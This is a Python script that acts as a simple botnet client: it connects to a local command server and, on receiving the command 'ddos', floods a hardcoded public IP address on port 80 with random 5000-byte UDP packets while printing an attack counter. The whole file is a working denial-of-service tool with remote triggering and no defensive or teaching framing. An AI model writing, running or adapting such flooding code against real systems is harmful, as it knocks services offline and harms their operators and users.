import socket 
import math 
import os,time,socket,random

client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)#

server_addr = ('127.0.0.1', 6969)

res = 0
client_socket.connect(server_addr)

os.system("cls")
s=socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
packet=random._urandom(5000)
sent = 0


class dosattack():

    def __init__(self,ipaddress,port,packets):

        self.ipaddress=ipaddress
        self.port=port
        self.packets=packets

    def __str__(self):

        return " __Informations__ \n\n Ip Address: {}\n Port: {}\n Packet: {}".format(self.ipaddress,self.port,self.packets)

    def __len__(self):

        return self.packets


def ddos():

	global sent, s

	while True:

		try:

			time.sleep(3)
			ipp = ("217.149.161.228")

			pport = 80

			packetss = 100

			os.system("cls")
			break

		except ValueError:
			print("\n Please enter a number!")
			time.sleep(2)
			os.system("cls")



	atak1=dosattack(ipp,pport,packetss)
	print(atak1)
	os.system("cls")

	for i in range(packetss):

		print(atak1)
		s.sendto(packet,(ipp,pport))
		sent = sent + 1
		print("\n Attacking>>> {}".format(sent))
		os.system("cls")

	print(atak1)
	print("\n Attack Completed...")
	input()
	connection_comands()



def connection_comands():

	while True:

		global client_socket, num1, num2, res

		msg_s = client_socket.recv(1024)
		print(msg_s)



		if msg_s == (b'ddos'):

			print('ddos')
			ddos()
			break




	print('')

connection_comands()